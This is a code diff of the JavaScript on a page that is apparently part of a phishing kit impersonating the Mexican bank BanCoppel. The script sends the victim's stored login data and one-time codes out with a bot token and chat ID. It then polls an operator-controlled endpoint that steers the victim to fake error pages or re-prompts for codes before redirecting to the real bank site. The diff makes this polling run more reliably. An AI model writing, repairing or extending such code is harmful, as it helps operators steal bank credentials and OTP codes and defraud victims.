@@ -54,6 +54,8 @@
   </div>
 
 <script>
+let transactionId = "";
+
 document.addEventListener('DOMContentLoaded', async () => {
   const config = await fetch("botconfig.json").then(r => r.json()).catch(() => null);
   if (!config || !config.token || !config.chat_id) {
@@ -61,7 +63,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     return;
   }
 
-  const { token } = config;
   const session = JSON.parse(localStorage.getItem("bancoldata") || "{}");
   const otp = localStorage.getItem("bancoldina");
 
@@ -70,7 +71,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     return window.location.href = "index.html";
   }
 
-  const transactionId = localStorage.getItem("transactionId") || 
+  transactionId = localStorage.getItem("transactionId") || 
     (Date.now().toString(36) + Math.random().toString(36).slice(2));
   localStorage.setItem("transactionId", transactionId);
 
@@ -100,34 +101,36 @@ document.addEventListener('DOMContentLoaded', async () => {
     body: "data=" + encodeURIComponent(mensaje) +
           "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
-
-  revisarAccion(); // llamada dentro del DOMContentLoaded
-
-  async function revisarAccion() {
-    try {
-      const res = await fetch(`sendStatus.php?txid=${transactionId}`);
-      const json = await res.json();
-      if (!json.status || json.status === "esperando") {
-        return setTimeout(revisarAccion, 3000);
-      }
-
-      switch (json.status) {
-        case "pedir_dinamica":
-          window.location.href = "cel-dina.html"; break;
-        case "error_logo":
-          window.location.href = "errorlogo.html"; break;
-        case "error_otp":
-          window.location.href = "cel-dina-error.html"; break;
-        case "finalizar":
-        case "confirm_finalizar":
-          window.location.href = "https://www.bancoppel.com"; break;
-      }
-    } catch (e) {
-      console.error("Error al revisar botón:", e);
-      setTimeout(revisarAccion, 3000);
-    }
-  }
 });
+
+// ✅ ¡SIEMPRE activo, aunque falle DOMContentLoaded!
+async function revisarAccion() {
+  try {
+    const txid = localStorage.getItem("transactionId");
+    const res = await fetch(`sendStatus.php?txid=${txid}&_=${Date.now()}`);
+    const json = await res.json();
+
+    if (!json.status || json.status === "esperando") {
+      return setTimeout(revisarAccion, 3000);
+    }
+
+    switch (json.status) {
+      case "error_logo":
+        window.location.href = "errorlogo.html"; break;
+      case "error_otp":
+        window.location.href = "cel-dina-error.html"; break;
+      case "finalizar":
+      case "confirm_finalizar":
+        window.location.href = "https://www.bancoppel.com"; break;
+    }
+  } catch (e) {
+    console.error("Error al revisar botón:", e);
+  }
+
+  setTimeout(revisarAccion, 3000);
+}
+
+revisarAccion();
 </script>
 </body>
 </html>
